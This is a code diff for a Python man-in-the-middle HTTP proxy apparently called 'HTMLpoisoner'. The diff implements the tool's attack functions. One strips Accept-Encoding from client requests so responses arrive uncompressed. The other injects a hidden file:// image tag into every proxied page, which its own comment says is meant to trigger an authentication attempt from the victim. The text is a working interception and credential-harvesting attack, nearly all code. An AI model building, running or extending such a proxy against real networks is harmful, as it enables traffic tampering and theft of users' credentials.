@@ -2,19 +2,19 @@
 
 HOST = "0.0.0.0"
 PORT = 3128
-VERBOSE = False
+VERBOSE = True
 TESTING = True
+VERBOSETESTING = False
 MAX_CONN = 5
 BUFFER_SIZE = 4096
 
-TESTING_FILE_clientreq = 'HTMLpoisoner.clientreq.raw'
-TESTING_FILE_clientres = 'HTMLpoisoner.clientres.raw'
-TESTING_FILE_serverreq = 'HTMLpoisoner.serverreq.raw'
-TESTING_FILE_serverres = 'HTMLpoisoner.serverres.raw'
+TESTING_FILE_RxRequest = 'HTMLpoisoner.clientreq.raw'
+TESTING_FILE_RxResponse = 'HTMLpoisoner.clientres.raw'
+TESTING_FILE_TxRequest = 'HTMLpoisoner.serverreq.raw'
+TESTING_FILE_TxResponse = 'HTMLpoisoner.serverres.raw'
 
-import socket, sys
+import socket, sys, re, os
 from thread import *
-import os
 
 def acceptConnection(connection):
     data = connection.recv(BUFFER_SIZE)
@@ -24,13 +24,12 @@ def acceptConnection(connection):
 
 def cleanup():
     try:  # delete the smb.bin file if it exists - this is used for raw connection testing
-        os.remove(TESTING_FILE_clientreq)
-        os.remove(TESTING_FILE_clientres)
-        os.remove(TESTING_FILE_serverreq)
-        os.remove(TESTING_FILE_serverres)
+        os.remove(TESTING_FILE_RxRequest)
+        os.remove(TESTING_FILE_RxResponse)
+        os.remove(TESTING_FILE_TxRequest)
+        os.remove(TESTING_FILE_TxResponse)
     except:
         pass
-
 
 def getConnectionString(HeaderOne):
     # Example HeaderOne value:
@@ -39,35 +38,35 @@ def getConnectionString(HeaderOne):
     # from example should result in: "GET"
     try:
         method = HeaderOne.split(' ')[0]
-        if TESTING:
+        if VERBOSETESTING:
             print "Method: " + method
         # from example should result in: "http"
         transport = HeaderOne.split(' ')[1].split('://')[0]
-        if TESTING:
+        if VERBOSETESTING:
             print "Transport: " + transport
         # from example should result in: "www.google.com:8080"
         hostAndPort = HeaderOne.split(' ')[1].split('://')[1].split('/', 1)[0]
-        if TESTING:
+        if VERBOSETESTING:
             print "Host and Port: " + hostAndPort
         try:
             # from example should result in: "8080" (do this first to trigger the except earlier)
             port = hostAndPort.split(':')[1]
-            if TESTING:
+            if VERBOSETESTING:
                 print "Port: " + str(port)
             # from example should result in: "www.google.com"
             host = hostAndPort.split(':')[0]
-            if TESTING:
+            if VERBOSETESTING:
                 print "Host: " + host
         except IndexError:
             # from example should result in: "www.google.com"
             host = HeaderOne.split(' ')[1].split('://')[1].split('/',1)[0]
-            if TESTING:
+            if VERBOSETESTING:
                 print "Host: " + host
             port = 80
-            if TESTING:
+            if VERBOSETESTING:
                 print "Port: " + str(port)
         URI = '/' + HeaderOne.split(' ')[1].split('://')[1].split('/',1)[1]
-        if TESTING:
+        if VERBOSETESTING:
             print "URI: " +  URI
     except IndexError as ErrMsg:
         print 'RxHeaderOne issue detected: ' + str(ErrMsg)
@@ -75,19 +74,19 @@ def getConnectionString(HeaderOne):
     connString = {'method' : method, 'transport' : transport, 'host' : host, 'port' : port, 'URI' : URI}
     return connString
 
-def connectionHandler(RxConnection,RxData,RxAddress):
-    HTTPHeaders = getHeaders(RxData)
+def connectionHandler(RxConnection,RxRequest,RxAddress):
+    RxHeaders = getHeaders(RxRequest)
     # if HTTPHeaders is not a dictionary, it probably isn't an HTTP request so send the banner
-    if HTTPHeaders == False:
+    if RxHeaders == False:
         sendBanner(RxConnection)
-    connectionString = getConnectionString(HTTPHeaders['Req'])
+    connectionString = getConnectionString(RxHeaders['Req'])
 
-    TxData = weakenRequest(RxData)
+    TxRequest = weakenRequest(RxRequest)
 
     # Connect to real web server
     TxSocket = createSocketTx(connectionString)
     # Send data to real web server
-    TxSocket.send(TxData)
+    TxSocket.send(TxRequest)
 
     while True:
         # get data response
@@ -95,10 +94,9 @@ def connectionHandler(RxConnection,RxData,RxAddress):
 
         # if the response exists process it, otherwise don't
         if len(TxResponse) > 0:
-
             RxResponse = weakenResponse(TxResponse)
             RxConnection.send(RxResponse)
-            if TESTING and VERBOSE:
+            if VERBOSETESTING:
                 print 'Server response sent to proxy client at ' + str(RxAddress)
         else:
             break
@@ -132,9 +130,9 @@ def createSocketRx(host, port):
         sys.exit(2)
     return ServerSocket
 
-def getHeaders(reqData):
+def getHeaders(RxRequest):
     #Split out the data section from the headers / preamble
-    HTTPData = reqData.split("\r\n\r\n", 1)
+    HTTPData = RxRequest.split("\r\n\r\n", 1)
     #Split each line
     HTTPHeadersList = HTTPData[0].split("\r\n")
     try:
@@ -147,7 +145,7 @@ def getHeaders(reqData):
                 headerParts = header.split(":", 1)
                 HTTPHeadersDict[headerParts[0]] = headerParts[1]
             headerIndex += 1
-        if TESTING:
+        if VERBOSETESTING:
             print HTTPHeadersDict
         return HTTPHeadersDict
     except IndexError:
@@ -158,18 +156,37 @@ def sendBanner(connection):
     if TESTING:
         print "Banner sent"
 
+def weakenRequest(RxRequest): #placeholder for future function xxx
+    TxRequest = re.sub(r'\r\nAccept-Encoding:.*\r\n', '\r\nAccept-Encoding: none\r\n', RxRequest)
+    if VERBOSE and 'Accept-Encoding: none' in TxRequest:
+        print '[+] Client request weakened'
+    elif VERBOSE:
+        print '[!] Client request NOT weakened'
+    if VERBOSETESTING:
+        print TxRequest
+        writeRawData(TxRequest, TESTING_FILE_TxRequest)
+    return TxRequest #xxx
+
+def weakenResponse(TxResponse): # Inject HTML tag into response to ellicit resource request (and therefore auth attempt) from client
+    RxResponse = TxResponse.replace('</body>', '<img src="file://htmlinject/random.jpg" alt="" /></body>')
+    if '<img src="file://htmlinject/random.jpg" alt="" />' in RxResponse:
+        if VERBOSE:
+            print "[+] HTML poisoning performed"
+        RxResponse = re.sub(r'\r\nContent-Length:.*\r\n', '\r\nContent-Length: ' + str(len(str(RxResponse)) + len(str(len(str(RxResponse))))) + '\r\n', RxResponse)
+    elif VERBOSETESTING:
+        print '[!] No HTML poisoning achieved'
+    if TESTING:
+        writeRawData(RxResponse, TESTING_FILE_RxResponse)
+    #if len(RxResponse) != None:
+     #   RxResponse = re.sub(('\r\nContent-Length', len(RxResponse))#xxx
+    return RxResponse #xxx
+
 def writeRawData(data, filename):
-    if VERBOSE:
+    if VERBOSETESTING:
         print "Attempting to write raw data to disk ("+filename+") for testing purposes"
     outputFile = open(filename, "ab")
-    outputFile.write(data)
+    outputFile.write('\r\n\r\n' + data)
     outputFile.close()
-
-def weakenRequest(RxData): #placeholder for future function xxx
-    return RxData
-
-def weakenResponse(TxResponse): #placeholder for future function xxx
-    return TxResponse
 
 #get the thing up and running
 def main():
@@ -180,13 +197,13 @@ def main():
     #always try and keep a socket open
     while True:
         RxConnection, RxAddress = RxSocket.accept()
-        RxData = acceptConnection(RxConnection)
+        RxRequest = acceptConnection(RxConnection)
         if TESTING:
-            writeRawData(RxData, TESTING_FILE_clientreq)
-        if VERBOSE:
+            writeRawData(RxRequest, TESTING_FILE_RxRequest)
+        if VERBOSETESTING:
             print "Connection from: " + RxAddress[0] + ":" + str(RxAddress[1])
         #when new connections are received, spawn a new thread to handle it
-        start_new_thread(connectionHandler, (RxConnection,RxData,RxAddress))
+        start_new_thread(connectionHandler, (RxConnection,RxRequest,RxAddress))
         RxSocket.close
 
 if __name__ == '__main__':
